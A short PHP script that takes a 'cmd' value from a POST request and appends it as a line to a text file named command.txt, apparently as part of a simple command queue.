<?php
	if(isset($_POST) && !empty($_POST)){
		// Get data
		$cmd = $_POST['cmd'];

		if($cmd != ""){
			$filePath = '../command.txt';
			$cmd = $cmd . "\n";
			$handle = fopen($filePath, 'a') or die('Cannot open file:  '.$filePath);
			fwrite($handle, $cmd);
			fclose($handle);
		}
	}
?>